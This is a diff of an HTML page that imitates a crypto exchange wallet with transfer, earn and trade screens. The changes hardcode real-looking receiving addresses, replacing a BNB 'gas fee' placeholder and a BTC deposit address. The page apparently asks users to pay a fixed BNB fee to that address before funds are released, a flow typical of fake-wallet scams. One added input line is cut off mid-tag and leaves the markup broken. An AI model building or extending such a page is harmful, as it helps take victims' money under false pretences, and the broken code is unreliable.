@@ -165,11 +165,12 @@
   </div>
   <button onclick="goToPreviousPage()" class="text-sm text-yellow-400 hover:underline mb-6">← Back</button>
 </section>  
-  <!-- ✅ PAGE 8 - TRANSFER TO MAIN WALLET --><section id="page8" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
+  <!-- ✅ PAGE 8 - TRANSFER TO MAIN WALLET -->
+  <section id="page8" class="page hidden min-h-screen flex items-center justify-center bg-[#0b0e11] text-white px-4 transition-opacity duration-300">
   <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl">
     <h2 class="text-2xl font-bold text-yellow-400 mb-4">Transfer to Main Wallet</h2><label class="block text-sm mb-1">Amount (USDT)</label>
 <input id="transferAmount" type="number" placeholder="Enter amount" class="w-full mb-4 p-3 rounded bg-[#1c232b] border border-gray-600 text-white">
-
+<input id="Walletaddress" type=
 <div class="flex justify-between items-center mb-4">
   <span class="text-sm">Gas Fee</span>
   <span class="text-yellow-400 font-semibold">0.09490 BNB</span>
@@ -195,7 +196,7 @@
   <div class="w-full max-w-md bg-[#10151c] p-6 rounded-xl shadow-xl">
     <h2 class="text-xl font-bold text-yellow-400 mb-4">BNB Gas Confirmation</h2>
     <p class="text-sm text-gray-300 mb-4">Please confirm your BNB gas fee address:</p><div class="flex items-center justify-between bg-[#1c232b] p-3 rounded mb-4">
-  <span id="bnbAddress" class="truncate">0xAb...cDe5</span>
+  <span id="bnbAddress" class="truncate">0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</span>
   <button onclick="copyBNBAddress()" class="text-yellow-400 hover:underline text-sm">Copy</button>
 </div>
 
@@ -241,7 +242,7 @@
   <h1 class="text-3xl md:text-4xl font-extrabold tracking-tight select-none">📈 Earn Menu</h1>
   <button onclick="showPage('page4')"
     class="bg-[#1E2124] text-white px-4 py-2 rounded-lg font-bold hover:bg-[#2c2f33] transition select-none">
-    ⬅ Back to Dashboard
+    ⬅ Back
   </button>
 </div>
 
@@ -435,7 +436,7 @@
 <div class="pt-8">
   <button onclick="showPage('page16')"
     class="bg-[#f0b90b] text-black font-semibold py-3 px-6 rounded-xl hover:bg-yellow-400 transition">
-    ⬅ Back to Trade Menu
+    ⬅ Back
   </button>
 </div>
 
@@ -538,7 +539,7 @@
   <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script><script>
   const addresses = {
     ETH: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
-    BTC: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+    BTC: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu",
     BNB: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
     USDT_TRON: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco"
   };
@@ -1139,7 +1140,7 @@ tradeForm.addEventListener("submit", (e) => {
 <script>
   const addresses = {
     ETH: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
-    BTC: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+    BTC: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu",
     BNB: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130",
     USDT_TRON: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco"
   };
